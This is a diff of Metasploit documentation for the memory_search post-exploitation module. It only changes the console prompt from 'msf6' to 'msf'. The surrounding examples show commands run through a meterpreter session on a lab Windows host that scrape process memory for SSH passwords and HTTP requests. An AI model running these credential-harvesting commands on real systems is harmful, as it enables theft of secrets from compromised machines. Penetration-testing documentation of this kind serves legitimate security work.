@@ -51,7 +51,7 @@ Save the memory matches to loot. (default: `true`)
 
 In this scenario, the Windows target is connected to a different host using `ssh.exe` using the password `myverysecretpassword`:
 ```
-msf6 post(multi/gather/memory_search) > sessions
+msf post(multi/gather/memory_search) > sessions
 
 Active sessions
 ===============
@@ -60,7 +60,7 @@ Active sessions
   --  ----  ----                     -----------                              ----------
   3         meterpreter x64/windows  DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB  192.168.112.1:4444 -> 192.168.112.129:55513 (192.168.112.129)
 
-msf6 post(multi/gather/memory_search) > run session=-1 regex="publickey,password.*" process_ids='' process_names_glob="ssh.*"
+msf post(multi/gather/memory_search) > run session=-1 regex="publickey,password.*" process_ids='' process_names_glob="ssh.*"
 
 [*] Running module against - DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB (192.168.112.129). This might take a few seconds...
 [*] Getting target processes...
@@ -82,7 +82,7 @@ msf6 post(multi/gather/memory_search) > run session=-1 regex="publickey,password
 
 In this scenario, the Windows target is running the `http.server` module in Python:
 ```
-msf6 post(multi/gather/memory_search) > sessions
+msf post(multi/gather/memory_search) > sessions
 
 Active sessions
 ===============
@@ -91,7 +91,7 @@ Active sessions
   --  ----  ----                     -----------                              ----------
   3         meterpreter x64/windows  DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB  192.168.112.1:4444 -> 192.168.112.129:55513 (192.168.112.129)
   
-msf6 post(multi/gather/memory_search) > run session=-1 regex="GET /.*" process_ids='' process_names_glob="python.*|[Ww]indows[Tt]erminal.*"
+msf post(multi/gather/memory_search) > run session=-1 regex="GET /.*" process_ids='' process_names_glob="python.*|[Ww]indows[Tt]erminal.*"
 
 [*] Running module against - DESKTOP-NO8VQQB\win10 @ DESKTOP-NO8VQQB (192.168.112.129). This might take a few seconds...
 [*] Getting target processes...
